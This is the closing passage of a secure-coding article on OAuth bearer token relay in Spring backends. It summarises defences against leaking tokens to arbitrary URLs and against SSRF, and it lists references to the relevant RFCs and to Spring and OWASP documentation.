**Remember:** The backend must never use its privileges and credentials to send Access Tokens to **caller-chosen arbitrary URLs**. Token relay only forwards the current token to a trusted downstream service with a matching audience and scope; when another resource must be called, use **OAuth Token Exchange** so the Authorization Server issues a new token per policy. If the business logic needs to fetch user-entered URLs, isolate a fetcher without OAuth credentials and protect it against SSRF. Recipient control, redirects, DNS/egress, authorization, and logging are all parts of the same security boundary.

## References

- [RFC 6750 — OAuth 2.0 Bearer Token Usage](https://www.rfc-editor.org/rfc/rfc6750).
- [RFC 6749 — The OAuth 2.0 Authorization Framework](https://www.rfc-editor.org/rfc/rfc6749).
- [RFC 8693 — OAuth 2.0 Token Exchange](https://www.rfc-editor.org/rfc/rfc8693).
- [RFC 8707 — Resource Indicators for OAuth 2.0](https://www.rfc-editor.org/rfc/rfc8707).
- [RFC 9700 — Best Current Practice for OAuth 2.0 Security](https://www.rfc-editor.org/rfc/rfc9700).
- [Spring Security — Servlet OAuth2 Client](https://docs.spring.io/spring-security/reference/servlet/oauth2/client/index.html).
- [Spring Security — OAuth2 Resource Server](https://docs.spring.io/spring-security/reference/servlet/oauth2/resource-server/index.html).
- [Spring Security — ServletBearerExchangeFilterFunction API](https://docs.spring.io/spring-security/reference/api/java/org/springframework/security/oauth2/server/resource/web/reactive/function/client/ServletBearerExchangeFilterFunction.html).
- [Spring Security — OAuth2AuthorizedClientManager API](https://docs.spring.io/spring-security/reference/api/java/org/springframework/security/oauth2/client/OAuth2AuthorizedClientManager.html).
- [Spring Cloud Gateway — TokenRelay GatewayFilter Factory](https://docs.spring.io/spring-cloud-gateway/reference/spring-cloud-gateway-server-webflux/gatewayfilter-factories/tokenrelay-factory.html).
- [OWASP — Server Side Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html).
- [OWASP — Secrets Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html).
